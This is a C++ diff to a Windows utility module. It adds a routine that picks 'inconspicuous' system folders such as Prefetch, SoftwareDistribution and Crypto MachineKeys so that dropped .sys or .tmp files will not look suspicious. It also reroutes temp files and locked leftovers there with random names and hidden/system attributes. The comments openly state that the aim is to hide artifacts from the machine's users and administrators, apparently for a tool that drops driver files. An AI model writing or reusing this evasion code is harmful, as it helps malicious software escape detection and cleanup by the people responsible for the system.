@@ -269,6 +269,78 @@ namespace Utils {
         return NT_SUCCESS(status);
     }
 
+    // Returns a random writable directory from a pool of inconspicuous
+    // system locations. Falls back to the Windows system temp directory
+    // (%SystemRoot%\Temp) if none of the candidates are available.
+    std::wstring GetRandomSystemDirectory() {
+        WCHAR winDir[MAX_PATH] = {};
+        DWORD winLen = GetWindowsDirectoryW(winDir, MAX_PATH);
+        if (winLen == 0 || winLen >= MAX_PATH)
+            return L"";
+
+        WCHAR programData[MAX_PATH] = {};
+        DWORD pdLen = GetEnvironmentVariableW(L"ProgramData", programData, MAX_PATH);
+
+        // Build a pool of plausible system directories that an admin has
+        // write access to and where a stray .sys or .tmp won't look suspicious.
+        std::wstring candidates[12];
+        int count = 0;
+
+        // Windows system temp (not user temp)
+        candidates[count++] = std::wstring(winDir) + L"\\Temp";
+
+        // Windows SoftwareDistribution — littered with random download artifacts
+        candidates[count++] = std::wstring(winDir) + L"\\SoftwareDistribution\\Download";
+
+        // Windows Prefetch — contains lots of opaque binary files
+        candidates[count++] = std::wstring(winDir) + L"\\Prefetch";
+
+        // Windows ServiceProfiles — deep, rarely inspected
+        candidates[count++] = std::wstring(winDir) + L"\\ServiceProfiles\\LocalService\\AppData\\Local\\Temp";
+
+        // Windows Logs — verbose, rarely cleaned
+        candidates[count++] = std::wstring(winDir) + L"\\Logs\\MoSetup";
+
+        // INF staging area
+        candidates[count++] = std::wstring(winDir) + L"\\INF";
+
+        if (pdLen > 0 && pdLen < MAX_PATH) {
+            // ProgramData subfolders that always exist and accumulate cruft
+            candidates[count++] = std::wstring(programData) + L"\\Microsoft\\Windows\\WER\\Temp";
+            candidates[count++] = std::wstring(programData) + L"\\Microsoft\\Windows\\Caches";
+            candidates[count++] = std::wstring(programData) + L"\\Microsoft\\Crypto\\RSA\\MachineKeys";
+            candidates[count++] = std::wstring(programData) + L"\\USOShared\\Logs";
+        }
+
+        // Shuffle and pick the first writable candidate
+        static std::mt19937 rng(static_cast<unsigned int>(__rdtsc()));
+        for (int i = count - 1; i > 0; i--) {
+            std::uniform_int_distribution<int> dist(0, i);
+            int j = dist(rng);
+            std::swap(candidates[i], candidates[j]);
+        }
+
+        for (int i = 0; i < count; i++) {
+            DWORD attr = GetFileAttributesW(candidates[i].c_str());
+            if (attr == INVALID_FILE_ATTRIBUTES)
+                continue;
+            if (!(attr & FILE_ATTRIBUTE_DIRECTORY))
+                continue;
+
+            // Probe write access by attempting to create and immediately delete a temp file
+            std::wstring probe = candidates[i] + L"\\" + GenerateRandomName(8) + L".tmp";
+            HANDLE hProbe = CreateFileW(probe.c_str(), GENERIC_WRITE, 0, nullptr,
+                CREATE_NEW, FILE_ATTRIBUTE_TEMPORARY | FILE_FLAG_DELETE_ON_CLOSE, nullptr);
+            if (hProbe != INVALID_HANDLE_VALUE) {
+                CloseHandle(hProbe);
+                return candidates[i];
+            }
+        }
+
+        // Last resort: plain Windows\Temp (always writable for admins)
+        return std::wstring(winDir) + L"\\Temp";
+    }
+
     BOOL ForceDeleteOrRename(PCWSTR filePath) {
         // 1. Try standard deletion first
         if (DeleteFileW(filePath)) {
@@ -280,12 +352,11 @@ namespace Utils {
             return TRUE;
         }
 
-        // 3. If the kernel locks the file heavily, rename it out of the way.
-        // This ensures the user doesn't see the leftover file in the Temp directory.
-        WCHAR tempPath[MAX_PATH + 1];
-        DWORD len = GetTempPathW(MAX_PATH, tempPath);
-        if (len > 0 && len <= MAX_PATH) {
-            std::wstring newName = std::wstring(tempPath) + GenerateRandomName(16) + L".tmp";
+        // 3. If the kernel locks the file heavily, rename it out of the way
+        // into a random system directory so it's not sitting in an obvious spot.
+        std::wstring hideDir = GetRandomSystemDirectory();
+        if (!hideDir.empty()) {
+            std::wstring newName = hideDir + L"\\" + GenerateRandomName(16) + L".tmp";
             if (MoveFileW(filePath, newName.c_str())) {
                 SetFileAttributesW(newName.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_TEMPORARY);
                 MoveFileExW(newName.c_str(), NULL, MOVEFILE_DELAY_UNTIL_REBOOT);
@@ -300,15 +371,12 @@ namespace Utils {
     }
 
     std::wstring GetTempFilePath(PCWSTR extension) {
-        WCHAR tempPath[MAX_PATH + 1];
-        DWORD len = GetTempPathW(MAX_PATH, tempPath);
-        if (len == 0 || len > MAX_PATH) {
+        std::wstring dir = GetRandomSystemDirectory();
+        if (dir.empty())
             return L"";
-        }
 
         std::wstring name = GenerateRandomName(12);
-        std::wstring fullPath = std::wstring(tempPath) + name + extension;
-        return fullPath;
+        return dir + L"\\" + name + extension;
     }
 
 
